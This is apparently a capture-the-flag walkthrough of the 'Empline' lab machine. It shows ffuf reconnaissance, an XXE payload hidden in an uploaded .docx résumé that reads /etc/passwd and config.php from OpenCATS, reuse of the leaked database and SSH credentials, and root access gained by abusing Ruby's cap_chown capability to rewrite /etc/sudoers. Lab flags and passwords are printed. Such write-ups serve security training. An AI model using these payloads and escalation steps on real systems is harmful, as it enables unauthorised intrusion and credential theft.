# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |
| 3306 | MYSQL |



# RECONNAISSANCE
---

Let's add `empline.thm` to our `/etc/hosts` file:

```bash
echo 'IP empline.thm' | sudo tee -a /etc/hosts
```


![Pasted image 20250430153941.png](../../IMAGES/Pasted%20image%2020250430153941.png)

Nothing weird on the main page, source code is normal too, let's proceed to fuzz for directories and subdomains:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://empline.thm/FUZZ" -ic -c -t 200 -e .php,.html,.git

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://empline.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .git
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 155ms]
index.html [Status: 200, Size: 14058, Words: 5495, Lines: 288, Duration: 155ms]
.php [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 156ms]
assets [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 155ms]
javascript [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
```

Nothing too interesting, let's fuzz subdomains then:


```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.246.235 -H "Host: FUZZ.empline.thm" -mc 200,301,302 -fs 14058 -t 100 -ic -c

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.246.235
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header : Host: FUZZ.empline.thm
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 100
 :: Matcher : Response status: 200,301,302
 :: Filter : Response size: 14058
________________________________________________

job [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 181ms]
www.job [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 175ms]
```


We can add to `/etc/hosts` and check them out:

![Pasted image 20250430154133.png](../../IMAGES/Pasted%20image%2020250430154133.png)

There is something called `opencats`, we got a login page, if we check source code we can find this:

![Pasted image 20250430154325.png](../../IMAGES/Pasted%20image%2020250430154325.png)

I tried these credentials but they didn't work, let's fuzz this subdomain to check if it got anything interesting:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://job.empline.thm/FUZZ" -ic -c -t 200 -e .php,.html,.git

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://job.empline.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .git
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 160ms]
images [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 161ms]
.php [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 161ms]
index.php [Status: 200, Size: 3671, Words: 209, Lines: 102, Duration: 171ms]
xml [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 155ms]
modules [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 164ms]
careers [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 155ms]
scripts [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 155ms]
upload [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 172ms]
rss [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 7913ms]
ajax [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 155ms]
ajax.php [Status: 200, Size: 140, Words: 13, Lines: 6, Duration: 159ms]
test [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 155ms]
lib [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 156ms]
src [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 155ms]
db [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 154ms]
js [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
javascript [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 155ms]
temp [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 156ms]
vendor [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 159ms]
config.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 155ms]
attachments [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 154ms]
ci [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 155ms]
```

Well there's a lot of stuff we can check, let's do it:

![Pasted image 20250430154635.png](../../IMAGES/Pasted%20image%2020250430154635.png)

On the `xml` directory, we can find this:

```xml
<source>
<publisher>CATS Applicant Tracking System</publisher>
<publisherurl>http://www.catsone.com</publisherurl>
<lastBuildDate>Wed, 30 Apr 2025 20:45:55 UTC</lastBuildDate>
<job>
<title>Mobile Dev</title>
<date>2021-07-20 19:56:21</date>
<referencenumber/>
<url>
http://job.empline.thm/careers/?p=showJob&ID=1&ref=indeed
</url>
<company>CATS (www.catsone.com)</company>
<city>Empline Lda</city>
<state>Empline Lda</state>
<country>US</country>
<postalcode/>
<description>
<h2>Skills</h2> <ul><li><span style="font-size:14px">Programming languages such as C#, Java, Objective-C</span></li><li><span style="font-size:14px">Strong organisational skills</span></li><li><span style="font-size:14px">Mathematical aptitude</span></li><li><span style="font-size:14px">The ability to learn quickly</span></li><li><span style="font-size:14px">The ability to interpret and follow technical plans</span></li><li><span style="font-size:14px">Problem-solving skills</span></li><li><span style="font-size:14px">Strong communication skills</span></li></ul>
</description>
</job>
</source>
```

The interesting part on here is this url:

```
http://job.empline.thm/careers/?p=showJob&ID=1&ref=indeed
```

We can maybe modify any of the parameters, let's check it out:

![Pasted image 20250430154748.png](../../IMAGES/Pasted%20image%2020250430154748.png)

If we change the `id` to 2, this happens:


![Pasted image 20250430154822.png](../../IMAGES/Pasted%20image%2020250430154822.png)

It redirect us back to the `?careers&&p=showAll` url, but, the interesting part on here is the `Apply to Position` stuff, let's check it out, in some case, it may contain some sort of section in which we can upload either a CV or any other stuff:


![Pasted image 20250430155138.png](../../IMAGES/Pasted%20image%2020250430155138.png)

We can search any vulnerability regarding the `opencats career` section:

![Pasted image 20250430161422.png](../../IMAGES/Pasted%20image%2020250430161422.png)

Seems like we are dealing with a `XXE`, let's proceed to exploitation.




# EXPLOITATION
---

![Pasted image 20250430161515.png](../../IMAGES/Pasted%20image%2020250430161515.png)

We can read system files exploiting the `XXE` in the following way, let's start by creating a python script which creates a simple document:

![Pasted image 20250430161742.png](../../IMAGES/Pasted%20image%2020250430161742.png)

```python
from docx import Document

document = Document()
paragraph = document.add_paragraph('Reginald Dodd')
document.save('resume.docx')
```

If we don't have the `docx` library installed, we can install it with:

```python
pip install python-docx
```

Now we need to do this:

![Pasted image 20250430162215.png](../../IMAGES/Pasted%20image%2020250430162215.png)

Let's unzip it and add the `XXE` code:

![Pasted image 20250430162255.png](../../IMAGES/Pasted%20image%2020250430162255.png)

Now, we need to copy the payload and change the `Reginald Dodd` stuff to `&test;`:

```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
```

![Pasted image 20250430162458.png](../../IMAGES/Pasted%20image%2020250430162458.png)

![Pasted image 20250430162445.png](../../IMAGES/Pasted%20image%2020250430162445.png)

Once we do the modifications, we need to zip it again, let's do:

```
zip resume.docx word/document.xml
```

Now, let's upload the file:


![Pasted image 20250430162629.png](../../IMAGES/Pasted%20image%2020250430162629.png)

There we go, as we can see, we are able to read `/etc/passwd`, let's modify the contents to read `config.php`, we need to unzip the `resume.docx` again, and change the payload to this one:

```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>
```

![Pasted image 20250430163216.png](../../IMAGES/Pasted%20image%2020250430163216.png)

Let's zip it again:

```
zip resume.docx word/document.xml
```

If we upload it:


![Pasted image 20250430163726.png](../../IMAGES/Pasted%20image%2020250430163726.png)


Let's decode the contents and save them to a file, now, we can check the `config.php` file:


![Pasted image 20250430163822.png](../../IMAGES/Pasted%20image%2020250430163822.png)

We got credentials for the mysql port:

```
mysql -h 10.10.246.235 -u james -p --skip_ssl
```

```
ng6pUFvsGNtw
```

At the `user` table on the `opencats` database, we can see this:

![Pasted image 20250430164346.png](../../IMAGES/Pasted%20image%2020250430164346.png)

We got a hash for the George user, this user was found when we read the `/etc/passwd` file, since it got a console, we can decode the hash and get a session on ssh:

![Pasted image 20250430164451.png](../../IMAGES/Pasted%20image%2020250430164451.png)

```
george:pretonnevippasempre
```


![Pasted image 20250430164529.png](../../IMAGES/Pasted%20image%2020250430164529.png)


There we go, let's begin privilege escalation.



# PRIVILEGE ESCALATION
---


```
george@empline:~$ cat user.txt
91cb89c70aa2e5ce0e0116dab099078e
```


Let's use linpeas to check any PE vector:

![Pasted image 20250430164919.png](../../IMAGES/Pasted%20image%2020250430164919.png)

`Ruby` has the `cap_chown` capability set, we can do the following:

1. Create a Ruby Script to Change Ownership of`/etc/sudoers`

Create a file named`exploit.rb` with the following content:

```rb
File.chown(Process.uid, Process.gid, "/etc/sudoers")
```

2. Run the Script with the Vulnerable Ruby Binary:

```bash
/usr/local/bin/ruby exploit.rb
```

3. Modify`/etc/sudoers`: 

```
chmod 640 /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

4. Reset the ownership of `/etc/sudoers` to root:

```
/usr/local/bin/ruby -e 'File.chown(0, 0, "/etc/sudoers")'
```

5. Get a root shell:

```
sudo su -
```


![Pasted image 20250430170035.png](../../IMAGES/Pasted%20image%2020250430170035.png)

There we go, let's read final flag and finish the CTF:

```
root@empline:~# cat /root/root.txt
74fea7cd0556e9c6f22e6f54bc68f5d5
```


![Pasted image 20250430170111.png](../../IMAGES/Pasted%20image%2020250430170111.png)


